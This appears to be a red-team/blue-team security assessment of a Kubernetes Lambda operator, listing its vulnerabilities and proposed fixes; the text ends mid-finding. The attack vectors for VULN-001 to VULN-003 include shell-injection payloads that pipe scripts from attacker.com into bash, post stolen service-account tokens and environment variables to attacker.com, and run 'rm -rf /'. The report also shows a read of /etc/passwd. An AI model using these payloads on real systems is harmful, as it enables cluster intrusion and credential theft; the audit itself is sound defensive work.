# 🔴🔵 KNATIVE-LAMBDA-OPERATOR SECURITY ASSESSMENT REPORT

**Assessment Type:** Red Team Penetration Test + Blue Team Review  
**Assessment Date:** December 9, 2025  
**Assessors:** AI Security Agent (Red Team), AI Security Agent (Blue Team)  
**Target:** knative-lambda-operator  
**Version:** v1.5.6  
**Repository:** `/Users/brunolucena/workspace/bruno/repos/homelab/flux/infrastructure/knative-lambda-operator`  
**Status:** FINDINGS ONLY - NO REMEDIATION APPLIED

---

## 📊 EXECUTIVE SUMMARY

This report documents security vulnerabilities discovered during a comprehensive code review of the knative-lambda-operator project. The operator manages serverless Lambda functions on Kubernetes using Knative Serving and Eventing.

**⚠️ IMPORTANT: This report contains both Red Team (original) and Blue Team (review) findings.**

### Combined Risk Overview

| Severity | Red Team | Blue Team | Total | Status |
|----------|----------|-----------|-------|--------|
| 🔴 CRITICAL | 3 | 2 | **5** | Requires Immediate Action |
| 🟠 HIGH | 5 | 4 | **9** | Requires Urgent Action |
| 🟡 MEDIUM | 6 | 2 | **8** | Requires Planned Action |
| 🔵 LOW | 4 | 0 | **4** | Best Practice Improvements |
| **TOTAL** | **18** | **8** | **26** | |

### Blue Team Assessment Summary

| Category | Count |
|----------|-------|
| 🟢 Confirmed Valid Findings | 14 |
| 🟡 Overstated/Mischaracterized | 3 |
| 🔴 **MISSED Critical Vulnerabilities** | 8 |
| ⚪ Incomplete Analysis | 4 |

### Attack Surface Summary

- **CRD Input Validation:** Insufficient validation allows injection attacks
- **RBAC Permissions:** Overly permissive cluster-wide access
- **Build Pipeline:** Command injection via template interpolation
- **Runtime Security:** Dynamic code execution without sandboxing
- **Network Security:** Insecure registry communication, no network policies
- **Secret Management:** Cross-namespace access, plaintext storage
- **🆕 SSRF Vulnerabilities:** Go-git library allows server-side request forgery (Blue Team)
- **🆕 Template Injection:** Handler field allows code injection at Go template level (Blue Team)
- **🆕 Race Conditions:** In-memory locks don't protect distributed operations (Blue Team)

---

## 🔴 CRITICAL VULNERABILITIES

### VULN-001: Command Injection via Git Clone Script Template

| Field | Value |
|-------|-------|
| **ID** | VULN-001 |
| **Severity** | 🔴 CRITICAL |
| **CVSS Score** | 9.8 |
| **CWE** | CWE-78: OS Command Injection |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/templates/scripts/clone-git.sh.tmpl` (lines 15-22)

#### Vulnerable Code
```bash
# Line 15-16 in clone-git.sh.tmpl
git clone --depth 1 --branch {{ .Ref }} {{ .URL }} /tmp/repo

# Lines 18-22
{{- if .Path }}
cp -r /tmp/repo/{{ .Path }}/* /workspace/app/
{{- else }}
cp -r /tmp/repo/* /workspace/app/
{{- end }}
```

#### Description
The Git URL, Ref, and Path values from the `LambdaFunction` CRD are directly interpolated into shell commands without any sanitization or escaping. An attacker can craft a malicious `LambdaFunction` resource that injects arbitrary shell commands.

#### Attack Vector
```yaml
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: malicious-lambda
  namespace: default
spec:
  source:
    type: git
    git:
      # Command injection in URL
      url: "https://github.com/legit/repo; curl http://attacker.com/shell.sh | bash #"
      # Or in ref
      ref: "main; cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/token; curl -X POST -d @/tmp/token http://attacker.com/exfil #"
      # Or in path  
      path: "../../../etc; cat /etc/passwd #"
  runtime:
    language: python
    version: "3.11"
```

#### Impact
- Remote Code Execution (RCE) in build pods
- Access to Kubernetes service account tokens
- Lateral movement within the cluster
- Exfiltration of sensitive data
- Potential cluster compromise

#### Proof of Concept Steps
1. Create LambdaFunction with malicious git URL containing shell metacharacters
2. Operator creates build job with injected commands
3. Commands execute in init container with cluster access
4. Attacker receives reverse shell or exfiltrated data

#### Remediation
```go
// In src/operator/internal/build/manager.go or new validation package

import (
    "regexp"
    "fmt"
)

var (
    // Whitelist pattern for Git URLs
    validGitURL = regexp.MustCompile(`^(https?://|git@)[a-zA-Z0-9][-a-zA-Z0-9.]*[a-zA-Z0-9](/[-a-zA-Z0-9._~:/?#\[\]@!$&'()*+,;=%]*)?$`)
    
    // Whitelist pattern for Git refs (branch, tag, commit)
    validGitRef = regexp.MustCompile(`^[a-zA-Z0-9][-a-zA-Z0-9._/]*$`)
    
    // Whitelist pattern for paths
    validPath = regexp.MustCompile(`^[a-zA-Z0-9][-a-zA-Z0-9._/]*$`)
    
    // Dangerous shell metacharacters
    shellMetachars = regexp.MustCompile(`[;&|$` + "`" + `(){}[\]<>!#*?~\n\r\\]`)
)

func ValidateGitSource(git *GitSource) error {
    if git == nil {
        return fmt.Errorf("git source is nil")
    }
    
    // Validate URL
    if !validGitURL.MatchString(git.URL) {
        return fmt.Errorf("invalid git URL format: %s", git.URL)
    }
    if shellMetachars.MatchString(git.URL) {
        return fmt.Errorf("git URL contains invalid characters")
    }
    
    // Validate Ref
    if git.Ref != "" && !validGitRef.MatchString(git.Ref) {
        return fmt.Errorf("invalid git ref format: %s", git.Ref)
    }
    
    // Validate Path - prevent directory traversal
    if git.Path != "" {
        if !validPath.MatchString(git.Path) {
            return fmt.Errorf("invalid path format: %s", git.Path)
        }
        if strings.Contains(git.Path, "..") {
            return fmt.Errorf("path traversal detected in git path")
        }
    }
    
    return nil
}
```

#### Files to Modify
1. `src/operator/internal/build/manager.go` - Add validation before template rendering
2. `src/operator/controllers/lambdafunction_controller.go` - Add validation in `validateSpec()`
3. `src/operator/internal/build/templates/scripts/clone-git.sh.tmpl` - Use quoted variables
4. Create new file: `src/operator/internal/validation/input_validation.go`

---

### VULN-002: Command Injection via MinIO/S3 Download Scripts

| Field | Value |
|-------|-------|
| **ID** | VULN-002 |
| **Severity** | 🔴 CRITICAL |
| **CVSS Score** | 9.8 |
| **CWE** | CWE-78: OS Command Injection |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/templates/scripts/download-minio.sh.tmpl` (lines 13-16)
- `src/operator/internal/build/templates/scripts/download-s3.sh.tmpl`
- `src/operator/internal/build/templates/scripts/download-gcs.sh.tmpl`

#### Vulnerable Code
```bash
# download-minio.sh.tmpl lines 13-16
mc alias set source http://{{ .Endpoint }} "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY"

mc cp --recursive source/{{ .Bucket }}/{{ .Key }} /workspace/app/
```

#### Description
The Endpoint, Bucket, and Key values are directly interpolated into shell commands. Attackers can inject commands via these fields.

#### Attack Vector
```yaml
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: minio-injection
spec:
  source:
    type: minio
    minio:
      endpoint: "minio.minio.svc; curl attacker.com/pwn.sh | bash #"
      bucket: "valid-bucket"
      key: "valid-key; rm -rf / #"
```

#### Impact
- Same as VULN-001: RCE, token theft, lateral movement

#### Remediation
```go
// Add to src/operator/internal/validation/input_validation.go

var (
    // Valid bucket name (AWS S3 naming rules)
    validBucketName = regexp.MustCompile(`^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$`)
    
    // Valid object key (S3 key naming)
    validObjectKey = regexp.MustCompile(`^[a-zA-Z0-9!_.*'()/-]+$`)
    
    // Valid endpoint (hostname:port or hostname)
    validEndpoint = regexp.MustCompile(`^[a-zA-Z0-9][-a-zA-Z0-9.]*[a-zA-Z0-9](:[0-9]{1,5})?$`)
)

func ValidateMinIOSource(minio *MinIOSource) error {
    if minio == nil {
        return fmt.Errorf("minio source is nil")
    }
    
    // Validate endpoint
    if minio.Endpoint != "" && !validEndpoint.MatchString(minio.Endpoint) {
        return fmt.Errorf("invalid minio endpoint format")
    }
    
    // Validate bucket
    if !validBucketName.MatchString(minio.Bucket) {
        return fmt.Errorf("invalid bucket name format")
    }
    
    // Validate key - prevent traversal
    if !validObjectKey.MatchString(minio.Key) {
        return fmt.Errorf("invalid object key format")
    }
    if strings.Contains(minio.Key, "..") {
        return fmt.Errorf("path traversal detected in object key")
    }
    
    return nil
}

func ValidateS3Source(s3 *S3Source) error {
    // Similar validation for S3
}

func ValidateGCSSource(gcs *GCSSource) error {
    // Similar validation for GCS
}
```

#### Files to Modify
1. `src/operator/internal/validation/input_validation.go` (create)
2. `src/operator/controllers/lambdafunction_controller.go`
3. All download script templates - use proper quoting

---

### VULN-003: Arbitrary Code Execution via Inline Source

| Field | Value |
|-------|-------|
| **ID** | VULN-003 |
| **Severity** | 🔴 CRITICAL |
| **CVSS Score** | 9.1 |
| **CWE** | CWE-94: Code Injection |
| **Status** | OPEN |

#### Affected Files
- `src/operator/api/v1alpha1/lambdafunction_types.go` (lines 165-174)
- `src/operator/internal/build/templates/runtimes/python/runtime.py.tmpl`
- `src/operator/internal/build/templates/runtimes/nodejs/runtime.js.tmpl`

#### Vulnerable Code
```go
// lambdafunction_types.go lines 165-174
type InlineSource struct {
    // Source code content - NO VALIDATION OR LIMITS
    // +kubebuilder:validation:Required
    Code string `json:"code"`

    // Dependencies (e.g., requirements.txt, package.json)
    // +optional
    Dependencies string `json:"dependencies,omitempty"`
}
```

#### Description
Inline source allows users to embed arbitrary code directly in the CRD. This code executes in pods with access to:
- Kubernetes service account tokens
- Environment variables (potentially containing secrets)
- Network access to cluster services

#### Attack Vector
```yaml
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: exfiltrator
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import urllib.request
        import json
        
        # Read service account token
        with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
            token = f.read()
        
        # Read all environment variables
        env_vars = dict(os.environ)
        
        # Exfiltrate to attacker
        data = json.dumps({'token': token, 'env': env_vars}).encode()
        req = urllib.request.Request('http://attacker.com/collect', data=data)
        urllib.request.urlopen(req)
        
        def handler(event):
            return {"status": "ok"}
      dependencies: |
        requests
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
```

#### Impact
- Exfiltration of service account tokens
- Access to cluster secrets via API
- Lateral movement to other services
- Persistent backdoor deployment

#### Remediation
This is a design-level issue. Options:

**Option A: Remove inline source entirely (most secure)**
```go
// Remove inline from SourceSpec
type SourceSpec struct {
    Type string `json:"type"`
    // +kubebuilder:validation:Enum=minio;s3;gcs;git;image
    // REMOVED: Inline *InlineSource `json:"inline,omitempty"`
}
```

**Option B: Sandbox inline code execution (complex)**
```go
// Add sandboxing configuration
type InlineSource struct {
    Code string `json:"code"`
    Dependencies string `json:"dependencies,omitempty"`
    
    // Sandbox configuration
    // +optional
    Sandbox *SandboxConfig `json:"sandbox,omitempty"`
}

type SandboxConfig struct {
    // Disable network access
    DisableNetwork bool `json:"disableNetwork,omitempty"`
    
    // Disable filesystem writes
    ReadOnlyFilesystem bool `json:"readOnlyFilesystem,omitempty"`
    
    // Drop all capabilities
    DropAllCapabilities bool `json:"dropAllCapabilities,omitempty"`
    
    // Run as non-root
    RunAsNonRoot bool `json:"runAsNonRoot,omitempty"`
}
```

**Option C: Restrict inline to specific namespaces (administrative control)**
```go
// Add annotation check in controller
func (r *LambdaFunctionReconciler) validateInlineSource(ctx context.Context, lambda *lambdav1alpha1.LambdaFunction) error {
    if lambda.Spec.Source.Type != "inline" {
        return nil
    }
    
    // Check if namespace is allowed for inline sources
    ns := &corev1.Namespace{}
    if err := r.Get(ctx, types.NamespacedName{Name: lambda.Namespace}, ns); err != nil {
        return err
    }
    
    if ns.Labels["lambda.knative.io/allow-inline"] != "true" {
        return fmt.Errorf("inline source not allowed in namespace %s", lambda.Namespace)
    }
    
    return nil
}
```

#### Files to Modify
1. `src/operator/api/v1alpha1/lambdafunction_types.go`
2. `src/operator/controllers/lambdafunction_controller.go`
3. `src/operator/internal/deploy/manager.go` - Add security context

---

## 🟠 HIGH SEVERITY VULNERABILITIES

### VULN-004: Overly Permissive RBAC - Cluster-Wide Secrets Access

| Field | Value |
|-------|-------|
| **ID** | VULN-004 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 8.4 |
| **CWE** | CWE-269: Improper Privilege Management |
| **Status** | OPEN |

#### Affected Files
- `k8s/base/rbac.yaml` (lines 97-111)

#### Vulnerable Configuration
```yaml
# Lines 97-111 in rbac.yaml
  - apiGroups:
      - ""
    resources:
      - configmaps
      - secrets
      - serviceaccounts
      - namespaces
    verbs:
      - create
      - delete
      - get
      - list
      - patch
      - update
      - watch
```

#### Description
The operator's ClusterRole grants full CRUD access to secrets across ALL namespaces. If the operator is compromised, attackers can:
- Read all secrets in the cluster
- Modify existing secrets
- Delete secrets (DoS)
- Create new secrets for persistence

#### Impact
- Complete cluster secret exposure
- Credential theft for all services
- Database credentials, API keys, TLS certificates exposed

#### Remediation
```yaml
# Replace cluster-wide secrets access with namespace-scoped
# k8s/base/rbac.yaml - MODIFIED

# Remove from ClusterRole:
# - secrets (get, list, watch only if needed for cross-namespace)

# Add namespace-scoped Role for each lambda namespace:
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: knative-lambda-operator-secrets
  namespace: "{{ .Namespace }}"  # Templated per namespace
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list", "watch"]
    # Only specific secrets needed
    resourceNames:
      - "minio-credentials"
      - "registry-credentials"
```

#### Files to Modify
1. `k8s/base/rbac.yaml` - Scope down ClusterRole
2. Create: `k8s/base/namespace-rbac.yaml` - Template for per-namespace roles
3. `src/operator/controllers/lambdafunction_controller.go` - Create namespace roles dynamically

---

### VULN-005: ClusterRole/ClusterRoleBinding Management Privilege Escalation

| Field | Value |
|-------|-------|
| **ID** | VULN-005 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 8.8 |
| **CWE** | CWE-269: Improper Privilege Management |
| **Status** | OPEN |

#### Affected Files
- `k8s/base/rbac.yaml` (lines 213-227)

#### Vulnerable Configuration
```yaml
# Lines 213-227
  - apiGroups:
      - rbac.authorization.k8s.io
    resources:
      - clusterroles
      - clusterrolebindings
    verbs:
      - create
      - delete
      - get
      - list
      - patch
      - update
      - watch
```

#### Description
The operator can create arbitrary ClusterRoles and ClusterRoleBindings. An attacker who compromises the operator can escalate to cluster-admin.

#### Attack Vector
```go
// Attacker code running in compromised lambda
clusterRole := &rbacv1.ClusterRole{
    ObjectMeta: metav1.ObjectMeta{Name: "attacker-admin"},
    Rules: []rbacv1.PolicyRule{{
        APIGroups: []string{"*"},
        Resources: []string{"*"},
        Verbs:     []string{"*"},
    }},
}
// Create cluster-admin equivalent role and bind to attacker SA
```

#### Remediation
```yaml
# Remove from ClusterRole entirely or scope to specific resources

# Option A: Remove entirely
# DELETE lines 213-227 from rbac.yaml

# Option B: Limit to specific named resources only
  - apiGroups:
      - rbac.authorization.k8s.io
    resources:
      - clusterroles
      - clusterrolebindings
    resourceNames:
      - "knative-lambda-build-watcher"  # Only specific role needed
    verbs:
      - get
      - list
      - watch
      # NO create, delete, patch, update
```

#### Files to Modify
1. `k8s/base/rbac.yaml` - Remove or heavily scope RBAC management

---

### VULN-006: Python Handler Dynamic Import Without Validation

| Field | Value |
|-------|-------|
| **ID** | VULN-006 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 7.5 |
| **CWE** | CWE-470: Use of Externally-Controlled Input to Select Classes/Code |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/templates/runtimes/python/runtime.py.tmpl` (lines 25-51)

#### Vulnerable Code
```python
# Lines 25-31
handler_parts = "{{ .Handler }}".rsplit('.', 1)
if len(handler_parts) != 2:
    raise ValueError(f"Invalid handler format: {{ .Handler }}. Expected 'module.function'")

module_name, func_name = handler_parts
# Import the module dynamically - DANGEROUS
handler_module = __import__(module_name, fromlist=[func_name])
```

#### Description
The handler value is used directly with `__import__()`, allowing import of any Python module including dangerous ones like `os`, `subprocess`, `socket`.

#### Attack Vector
```yaml
spec:
  runtime:
    language: python
    version: "3.11"
    handler: "os.system"  # Imports os module
```

#### Remediation
```python
# Modified runtime.py.tmpl with validation

import os
import sys
import re

# Whitelist of allowed module patterns
ALLOWED_MODULE_PATTERN = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')
BLOCKED_MODULES = {
    'os', 'subprocess', 'socket', 'shutil', 'sys', 
    'builtins', '__builtins__', 'importlib', 'ctypes',
    'multiprocessing', 'threading', 'asyncio.subprocess'
}

handler_str = "{{ .Handler }}"
handler_parts = handler_str.rsplit('.', 1)

if len(handler_parts) != 2:
    raise ValueError(f"Invalid handler format: {handler_str}. Expected 'module.function'")

module_name, func_name = handler_parts

# Validate module name
if not ALLOWED_MODULE_PATTERN.match(module_name):
    raise ValueError(f"Invalid module name: {module_name}")

# Block dangerous modules
if module_name in BLOCKED_MODULES:
    raise ValueError(f"Module '{module_name}' is not allowed")

# Only allow importing from the app directory
if module_name not in ['main', 'handler', 'index', 'app']:
    raise ValueError(f"Module '{module_name}' is not in allowed list. Use main, handler, index, or app")
```

#### Files to Modify
1. `src/operator/internal/build/templates/runtimes/python/runtime.py.tmpl`
2. `src/operator/internal/build/templates/runtimes/nodejs/runtime.js.tmpl` (similar fix)
3. `src/operator/api/v1alpha1/lambdafunction_types.go` - Add handler validation

---

### VULN-007: Insecure Container Registry Communication

| Field | Value |
|-------|-------|
| **ID** | VULN-007 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 7.4 |
| **CWE** | CWE-295: Improper Certificate Validation |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/manager.go` (lines 262-268)

#### Vulnerable Code
```go
// Lines 262-268
Args: []string{
    "--dockerfile=/workspace/Dockerfile",
    "--context=dir:///workspace",
    fmt.Sprintf("--destination=%s", imageURI),
    "--insecure",           // DANGEROUS
    "--insecure-pull",      // DANGEROUS
    "--skip-tls-verify",    // DANGEROUS
    "--cache=false",
},
```

#### Description
Kaniko is configured to skip TLS verification, enabling MITM attacks on image push/pull operations. Attackers on the network can:
- Intercept and modify images being pushed
- Inject malicious layers into pulled base images
- Steal credentials used for registry authentication

#### Remediation
```go
// src/operator/internal/build/manager.go - Modified

// Add configuration for secure vs insecure registries
type BuildConfig struct {
    // List of registries that are allowed to be insecure (internal only)
    InsecureRegistries []string
    // Enable TLS verification by default
    VerifyTLS bool
}

func (m *Manager) buildKanikoArgs(imageURI string, config BuildConfig) []string {
    args := []string{
        "--dockerfile=/workspace/Dockerfile",
        "--context=dir:///workspace",
        fmt.Sprintf("--destination=%s", imageURI),
        "--cache=false",
    }
    
    // Only add insecure flags for explicitly configured registries
    registry := extractRegistry(imageURI)
    isInsecure := false
    for _, insecureReg := range config.InsecureRegistries {
        if registry == insecureReg {
            isInsecure = true
            break
        }
    }
    
    if isInsecure {
        args = append(args, "--insecure")
    }
    
    // Never skip TLS for external registries
    // Remove --skip-tls-verify entirely
    
    return args
}
```

#### Files to Modify
1. `src/operator/internal/build/manager.go`
2. `src/operator/internal/build/config.go` - Add secure registry configuration
3. `k8s/base/deployment.yaml` - Add CA certificate mounts if needed

---

### VULN-008: Cross-Namespace Secret Access and Copying

| Field | Value |
|-------|-------|
| **ID** | VULN-008 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 7.2 |
| **CWE** | CWE-200: Information Exposure |
| **Status** | OPEN |

#### Affected Files
- `k8s/base/rbac.yaml` (lines 292-321)
- `k8s/base/minio-secret-init.yaml`

#### Vulnerable Configuration
```yaml
# rbac.yaml lines 292-306
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: knative-lambda-minio-secret-reader
  namespace: minio
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
```

```yaml
# minio-secret-init.yaml - kubectl commands copying secrets
kubectl get secret minio-credentials -n minio -o yaml | \
  sed 's/namespace: minio/namespace: knative-lambda/' | \
  kubectl apply -f -
```

#### Description
The operator has explicit access to read secrets from the minio namespace and copies them to other namespaces. This breaks namespace isolation and could be exploited to access secrets from any namespace if the pattern is extended.

#### Remediation
```yaml
# Option A: Use External Secrets Operator or Sealed Secrets instead

# Option B: Use Kubernetes Secret mirroring with proper controls
# Create a dedicated controller for secret synchronization with audit logging

# Option C: Direct reference without copying
# Modify build jobs to use secretRef pointing to minio namespace
# Requires additional RBAC for build pods
```

#### Files to Modify
1. `k8s/base/minio-secret-init.yaml` - Remove or replace with secure mechanism
2. `k8s/base/rbac.yaml` - Remove cross-namespace access
3. `src/operator/internal/build/manager.go` - Update secret reference handling

---

## 🟡 MEDIUM SEVERITY VULNERABILITIES

### VULN-009: Missing Input Validation on CRD Fields

| Field | Value |
|-------|-------|
| **ID** | VULN-009 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 6.5 |
| **CWE** | CWE-20: Improper Input Validation |
| **Status** | OPEN |

#### Affected Files
- `src/operator/api/v1alpha1/lambdafunction_types.go`
- `k8s/base/crd.yaml`

#### Description
Multiple CRD fields lack proper validation:
- No regex pattern for bucket names
- No length limits on inline code
- No URL format validation
- No handler format validation

#### Current State
```go
// No validation annotations on critical fields
type MinIOSource struct {
    Endpoint string `json:"endpoint,omitempty"`     // No pattern validation
    Bucket string `json:"bucket"`                   // No pattern validation
    Key string `json:"key"`                         // No pattern validation
}

type RuntimeSpec struct {
    Language string `json:"language"`               // Only enum validation
    Version string `json:"version"`                 // No pattern validation
    Handler string `json:"handler,omitempty"`       // No pattern validation
}
```

#### Remediation
```go
// Add kubebuilder validation markers

type MinIOSource struct {
    // +kubebuilder:validation:Pattern=`^[a-zA-Z0-9][-a-zA-Z0-9.]*[a-zA-Z0-9](:[0-9]{1,5})?$`
    // +kubebuilder:validation:MaxLength=253
    Endpoint string `json:"endpoint,omitempty"`
    
    // +kubebuilder:validation:Pattern=`^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$`
    // +kubebuilder:validation:MinLength=3
    // +kubebuilder:validation:MaxLength=63
    Bucket string `json:"bucket"`
    
    // +kubebuilder:validation:Pattern=`^[a-zA-Z0-9!_.*'()/-]+$`
    // +kubebuilder:validation:MaxLength=1024
    Key string `json:"key"`
}

type InlineSource struct {
    // +kubebuilder:validation:MaxLength=1048576
    // 1MB max for inline code
    Code string `json:"code"`
}

type RuntimeSpec struct {
    // +kubebuilder:validation:Pattern=`^[a-zA-Z_][a-zA-Z0-9_]*\.[a-zA-Z_][a-zA-Z0-9_]*$`
    Handler string `json:"handler,omitempty"`
    
    // +kubebuilder:validation:Pattern=`^[0-9]+(\.[0-9]+)*$`
    Version string `json:"version"`
}
```

#### Files to Modify
1. `src/operator/api/v1alpha1/lambdafunction_types.go` - Add validation markers
2. `src/operator/api/v1alpha1/lambdaagent_types.go` - Add validation markers
3. Run: `make generate manifests` to regenerate CRDs

---

### VULN-010: Sensitive Data in ConfigMaps (Unencrypted)

| Field | Value |
|-------|-------|
| **ID** | VULN-010 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 5.9 |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/manager.go` (lines 152-165)

#### Vulnerable Code
```go
// Lines 152-165
configMap := &corev1.ConfigMap{
    ObjectMeta: metav1.ObjectMeta{
        Name:      configMapName,
        Namespace: lambda.Namespace,
    },
    BinaryData: map[string][]byte{
        "context.tar.gz": archive,  // Contains source code
    },
}
```

#### Description
Build context including source code is stored in ConfigMaps. ConfigMaps are not encrypted at rest by default in Kubernetes, exposing proprietary code.

#### Remediation
```go
// Option A: Use Secrets instead (encrypted at rest if configured)
secret := &corev1.Secret{
    ObjectMeta: metav1.ObjectMeta{
        Name:      secretName,
        Namespace: lambda.Namespace,
    },
    Type: corev1.SecretTypeOpaque,
    Data: map[string][]byte{
        "context.tar.gz": archive,
    },
}

// Option B: Use emptyDir with memory medium (no disk storage)
// Modify build job to use emptyDir instead of ConfigMap

// Option C: Enable encryption at rest for ConfigMaps
// Cluster-level configuration in kube-apiserver
```

#### Files to Modify
1. `src/operator/internal/build/manager.go` - Change to Secret or emptyDir
2. Build job spec to mount Secret instead of ConfigMap

---

### VULN-011: Error Information Disclosure

| Field | Value |
|-------|-------|
| **ID** | VULN-011 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 5.3 |
| **CWE** | CWE-209: Information Exposure Through Error Messages |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/templates/runtimes/python/runtime.py.tmpl` (lines 87-99)

#### Vulnerable Code
```python
# Lines 87-99
except Exception as e:
    error_event = {
        "type": "lambda.execution.error",
        "source": "{{ .FunctionName }}",
        "data": {
            "error": str(e),
            "traceback": traceback.format_exc()  # FULL STACK TRACE
        }
    }
```

#### Description
Full Python stack traces are returned in error responses, leaking:
- Internal file paths
- Code structure
- Library versions
- Environment details

#### Remediation
```python
# Modified error handling
import logging

logger = logging.getLogger(__name__)

except Exception as e:
    # Log full error internally
    error_id = str(uuid.uuid4())[:8]
    logger.error(f"Error {error_id}: {str(e)}", exc_info=True)
    
    # Return sanitized error to caller
    error_event = {
        "type": "lambda.execution.error",
        "source": "{{ .FunctionName }}",
        "data": {
            "error_id": error_id,
            "error": "Internal error occurred",  # Generic message
            # NO traceback in response
        }
    }
```

#### Files to Modify
1. `src/operator/internal/build/templates/runtimes/python/runtime.py.tmpl`
2. `src/operator/internal/build/templates/runtimes/nodejs/runtime.js.tmpl`

---

### VULN-012: Missing Network Policies

| Field | Value |
|-------|-------|
| **ID** | VULN-012 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 6.1 |
| **CWE** | CWE-284: Improper Access Control |
| **Status** | OPEN |

#### Description
No NetworkPolicy resources are defined. All pods can communicate freely within the cluster, allowing:
- Lateral movement after initial compromise
- Access to sensitive services (databases, internal APIs)
- Exfiltration of data

#### Remediation
```yaml
# Create: k8s/base/networkpolicy.yaml

---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: knative-lambda-operator-network-policy
  namespace: knative-lambda
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: knative-lambda-operator
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # Allow Prometheus scraping
    - from:
        - namespaceSelector:
            matchLabels:
              name: monitoring
      ports:
        - port: 8080
          protocol: TCP
    # Allow health checks
    - ports:
        - port: 8081
          protocol: TCP
  egress:
    # Allow DNS
    - to:
        - namespaceSelector: {}
      ports:
        - port: 53
          protocol: UDP
    # Allow Kubernetes API
    - to:
        - ipBlock:
            cidr: 10.96.0.1/32  # Cluster API server
      ports:
        - port: 443
          protocol: TCP
    # Allow registry access
    - to:
        - namespaceSelector:
            matchLabels:
              name: registry
      ports:
        - port: 5000
          protocol: TCP
---
# Network policy for Lambda function pods
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: lambda-function-network-policy
  namespace: knative-lambda
spec:
  podSelector:
    matchLabels:
      lambda.knative.io/build: "true"
  policyTypes:
    - Egress
  egress:
    # Allow DNS only
    - to:
        - namespaceSelector: {}
      ports:
        - port: 53
          protocol: UDP
    # Allow registry for image push
    - to:
        - namespaceSelector:
            matchLabels:
              name: registry
      ports:
        - port: 5000
          protocol: TCP
```

#### Files to Modify
1. Create: `k8s/base/networkpolicy.yaml`
2. `k8s/base/kustomization.yaml` - Add networkpolicy.yaml to resources

---

### VULN-013: Receiver Mode Grants Operator Service Account

| Field | Value |
|-------|-------|
| **ID** | VULN-013 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 6.8 |
| **CWE** | CWE-269: Improper Privilege Management |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/deploy/manager.go` (lines 196-199)

#### Vulnerable Code
```go
// Lines 196-199
if lambda.Annotations != nil && lambda.Annotations["lambda.knative.io/receiver-mode"] == "true" {
    spec["serviceAccountName"] = "knative-lambda-operator"
}
```

#### Description
Any LambdaFunction with the `receiver-mode=true` annotation automatically receives the operator's service account, inheriting all its cluster-wide permissions.

#### Remediation
```go
// Create a dedicated, limited service account for receiver mode

// In deploy/manager.go
if lambda.Annotations != nil && lambda.Annotations["lambda.knative.io/receiver-mode"] == "true" {
    // Use dedicated receiver SA with limited permissions
    spec["serviceAccountName"] = "knative-lambda-receiver"
}

// Create separate RBAC for receiver:
// k8s/base/receiver-rbac.yaml
```

```yaml
# k8s/base/receiver-rbac.yaml
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: knative-lambda-receiver
  namespace: knative-lambda
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: knative-lambda-receiver
  namespace: knative-lambda
rules:
  # Only permissions needed for receiver mode
  - apiGroups: ["lambda.knative.io"]
    resources: ["lambdafunctions"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["events"]
    verbs: ["create"]
```

#### Files to Modify
1. `src/operator/internal/deploy/manager.go`
2. Create: `k8s/base/receiver-rbac.yaml`
3. `k8s/base/kustomization.yaml` - Add receiver-rbac.yaml

---

### VULN-014: No Webhook Admission Controller

| Field | Value |
|-------|-------|
| **ID** | VULN-014 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 5.5 |
| **CWE** | CWE-20: Improper Input Validation |
| **Status** | OPEN |

#### Description
No ValidatingWebhookConfiguration or MutatingWebhookConfiguration protects the CRDs. Malformed or malicious specs bypass validation until reconcile time, allowing:
- Injection attacks to persist in etcd
- DoS via malformed resources
- Bypassing validation by direct API access

#### Remediation
```go
// Create: src/operator/internal/webhook/validating_webhook.go

package webhook

import (
    "context"
    "fmt"
    "net/http"
    
    "sigs.k8s.io/controller-runtime/pkg/webhook/admission"
    lambdav1alpha1 "github.com/brunovlucena/knative-lambda-operator/api/v1alpha1"
)

type LambdaFunctionValidator struct {
    decoder *admission.Decoder
}

func (v *LambdaFunctionValidator) Handle(ctx context.Context, req admission.Request) admission.Response {
    lambda := &lambdav1alpha1.LambdaFunction{}
    
    if err := v.decoder.Decode(req, lambda); err != nil {
        return admission.Errored(http.StatusBadRequest, err)
    }
    
